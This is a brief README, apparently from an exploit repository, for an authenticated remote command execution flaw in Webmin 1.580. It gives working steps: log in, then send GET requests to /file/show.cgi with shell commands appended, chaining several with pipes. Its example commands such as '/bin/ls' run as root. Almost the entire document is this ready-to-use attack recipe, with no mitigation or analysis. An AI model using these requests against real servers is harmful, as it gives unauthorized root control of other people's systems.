# Webmin 1.580 Authenticated RCE Vulnerabilty

### Steps to get RCE:
1. Authenticate to Webmin (generally on port 10000)
2. Send a GET request to
`http://webmin-host:10000/file/show.cgi<COMMAND HERE>`, and your command gets executed as root on server.
	
    \<COMMAND HERE> can be something like '/bin/ls'
3. For multiple commands, send GET request to `http://webmin-host:10000/file/show.cgi<1st COMMAND HERE>|<2nd COMMAND HERE>|`

	<1st COMMAND HERE> can be something like '/bin/echo'

	<2nd COMMAND HERE> can be something like '/bin/ls%20--la'

	
**Webmin server runs on root, so anything executed by it is also with root.**
